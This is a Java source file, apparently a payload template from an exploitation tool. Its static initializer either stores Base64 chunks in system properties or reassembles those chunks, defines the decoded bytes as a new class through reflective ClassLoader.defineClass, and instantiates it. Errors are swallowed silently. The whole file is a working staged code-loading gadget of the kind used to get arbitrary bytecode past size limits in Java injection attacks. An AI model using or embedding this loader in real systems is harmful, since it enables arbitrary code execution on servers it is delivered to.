package com.ar3h.plugin.fr.template;

import java.lang.reflect.Method;
import java.util.Base64;

public class SepClassLoaderBytecode {
    public static boolean write;
    public static String data;
    public static int num;
    public static String property_prefix;

    public SepClassLoaderBytecode() {
    }

    static {
        try {
            if (!write) {
                StringBuilder hs = new StringBuilder();
                for (int k = 1; k < num + 1; k++) {
                    String s = System.getProperty(property_prefix + k);
                    if (s != null && !s.isEmpty()) {
                        hs.append(s);
                    } else {
                        break;
                    }
                }
                byte[] b = Base64.getDecoder().decode(hs.toString());
                Method de = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                de.setAccessible(true);
                Class c = (Class)de.invoke(SepClassLoaderBytecode.class.getClassLoader(), b, new Integer(0), new Integer(b.length));
                c.newInstance().equals("");
            } else {
                System.setProperty(property_prefix + num, data);
            }
        } catch (Exception e) {
        }

    }
}